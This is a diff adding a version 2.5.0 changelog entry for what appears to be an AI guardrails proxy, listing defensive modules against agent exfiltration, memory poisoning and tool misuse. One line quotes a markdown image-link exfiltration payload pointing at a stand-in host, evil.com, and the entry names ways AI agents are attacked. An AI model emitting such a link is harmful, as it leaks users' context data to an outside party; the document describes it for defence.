@@ -5,6 +5,23 @@ All notable changes to the **Agentic AI Security Firewall & LLM Guardrails Proxy
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [2.5.0] - 2026-09-25
+
+### Added
+- **Context Window Exfiltration & Covert Channel Guard (`context_exfiltration_guard.py`)**: Intercepts covert data exfiltration channels including parameterized markdown image links (`![img](https://evil.com/leak?data=...)`), HTML media tags, DNS tunneling syntax, and variable interpolation.
+- **Agent Tool Parameter Type & Semantic Bounds Enforcer (`tool_param_type_enforcer.py`)**: Deep semantic typing, numerical boundary enforcement, string length capping, and enum constraints on agentic tool parameters to prevent type confusion and buffer exhaustion.
+- **Dynamic Canary Vault with TTL Rotation (`canary_vault.py`)**: Cryptographic per-session canary lifecycle manager with automatic time-to-live expiration, thread-safe in-memory vault, and revocation checking.
+- **Multi-Agent Message Verification & HMAC Authentication Guard (`agent_message_signer.py`)**: Peer-to-peer agent message envelope signer and validator with HMAC-SHA256 signatures, clock-skew verification, and nonce replay defense.
+- **Semantic Loop & Agent Deadlock Breaker (`semantic_loop_breaker.py`)**: Rolling Jaccard and token-overlap analyzer that detects cyclic reasoning loops, repetitive tool failure retries, and agent deadlocks to prevent token exhaustion.
+- **Agent Persistent Memory Poisoning Guard (`memory_poisoning_guard.py`)**: Scans memory storage operations for covert directive overrides, exfiltration triggers, latent command execution hooks, persona hijacks, and false privilege elevation claims.
+- **OWASP Top 10 for Agentic AI Architecture Specification (`docs/OWASP_AGENTIC_AI_TOP_10.md`)**: Comprehensive coverage matrix mapping all proxy guardrails to risks ASI01 through ASI10 with SOC incident response runbooks.
+- **Adversarial Benchmark Expansion to 130 Test Cases**: Added `agentic_memory_and_exfil_attacks.json`, sustaining a **100.0% block rate, 0.0% false positives, and 1.0000 F1 score** across all 130 tests.
+- **Obsidian Amber Portal Simulator Enhancements**: Integrated Memory Poisoning and Markdown Exfiltration interactive sandbox presets.
+
+### Changed
+- Integrated context exfiltration, memory poisoning, parameter enforcement, and loop breaking guards directly into `SecurityPipeline` inbound and outbound stages.
+- Expanded automated unit and integration test suite to **237 passing tests**.
+
 ## [2.4.0] - 2026-09-24
 
 ### Added
